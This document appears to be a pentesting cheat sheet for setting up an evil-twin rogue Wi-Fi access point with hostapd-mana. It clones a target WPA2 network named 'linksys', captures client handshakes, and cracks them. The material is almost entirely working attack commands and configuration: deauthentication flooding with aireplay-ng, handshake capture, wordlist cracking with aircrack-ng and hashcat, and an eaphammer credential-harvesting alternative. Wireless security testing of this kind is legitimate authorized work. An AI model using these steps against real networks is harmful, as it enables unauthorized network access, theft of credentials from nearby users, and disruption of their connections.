## Rogue Access Point

```text
sudo apt install hostapd-mana
sudo apt-get install libssl-dev
```

### Note - A network card with interface modes "AP mode" is requred or the config will fail
```text
iw list | grep "Supported interface modes" -A 8

        Supported interface modes:
                 * IBSS
                 * managed
                 * AP
                 * AP/VLAN
                 * monitor
                 * mesh point
```

```text
sudo airodump-ng wlan0mon

BSSID              PWR  Beacons    #Data, #/s  CH   MB   ENC CIPHER  AUTH ESSID 
11:22:33:44:55:66  -68       12        1    0   1  130   WPA2 CCMP   PSK  linksys
```

At this point we know the following about our target AP:


It has an ESSID of linksys

It has a BSSID of 11:22:33:44:55:66

It uses WPA2 (TKIP/CCMP) (and probably WPA (TKIP/CCMP))

It uses a auth of PSK

It runs on channel 1


#### Create Configuration file
```text
cat linksys-mana.conf

interface=wlan0
ssid=linksys
channel=1
hw_mode=g
ieee80211n=1
wpa=3
wpa_key_mgmt=WPA-PSK
wpa_passphrase=ANYPASSWORD
wpa_pairwise=TKIP CCMP
rsn_pairwise=TKIP CCMP
mana_wpaout=/home/<name>/linksys.hccapx
```
We need to specify the band to 2.4 GHz by setting the hw_mode parameter to the letter "g". If the network was running on 5 GHz, we would set hw_mode to "a".

We will set the wpa parameter to the integer "3" to enable both WPA and WPA2 (setting this parameter to "1" enables only WPA and setting the value to "2" enables only WPA2).


#### Start Access Point
```text

sudo systemctl disable dnsmasq && sudo systemctl disable hostapd
sudo rfkill unblock wifi
sudo rfkill unblock all
sudo airmon-ng check kill
sudo ip link set dev wlan0 up
sudo ifconfig wlan0 up
sudo hostapd-mana linksys-mana.conf
```

Wait for a capture of a WPA/2 handshake in output.

##### De-Auth if needed
```text
sudo aireplay-ng -0 0 -a 11:22:33:44:55:66 wlan0mon
```

#### Crack!
```text
aircrack-ng linksys.hccapx -e linksys -w /usr/share/john/password.lst

or ...

hcxhash2cap --hccapx=linksys.hccapx -c out.cap
hcxpcapngtool -o hash.hc22000 -E wordlist out.cap
hashcat -m 22000 hash.hc22000 /usr/share/john/password.lst
```

#### eaphammer - alternative
```text
sudo eaphammer -i wlan0mon --channel 4 --auth wpa-eap --wpa-version 2 --essid linksys --creds
```


https://wiki.gentoo.org/wiki/Hostapd

https://tbhaxor.com/evil-twin-wifi-network-using-hostapd-mana/




